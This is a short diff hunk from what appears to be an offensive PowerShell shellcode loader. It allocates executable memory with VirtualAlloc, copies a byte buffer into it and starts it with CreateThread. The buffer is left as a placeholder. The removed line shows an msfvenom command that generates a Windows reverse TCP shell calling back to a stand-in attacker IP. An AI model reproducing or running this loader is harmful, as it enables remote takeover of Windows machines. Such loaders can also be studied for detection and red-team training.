@@ -34,7 +34,7 @@ public class CrtThread{
 "@
 Add-Type $CrtThread   
 
-[Byte[]] $buf = SHELLCODE_PLACEHOLDER //To create shell ("msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT -f powershell")
+[Byte[]] $buf = SHELLCODE_PLACEHOLDER
 [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
 $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
